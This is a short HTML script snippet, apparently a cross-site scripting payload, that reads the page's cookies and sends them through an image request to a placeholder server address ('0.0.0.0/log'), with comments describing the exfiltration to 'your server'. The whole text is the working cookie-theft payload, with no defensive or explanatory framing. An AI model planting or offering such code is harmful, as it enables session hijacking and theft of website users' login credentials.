

<script>
    // Extract the cookie value
    var cookieValue = document.cookie;

    // Create an image element to send the cookie value to your server
    var img = new Image();
    img.src = "http://0.0.0.0/log?cookie=" + encodeURIComponent(cookieValue);
</script>
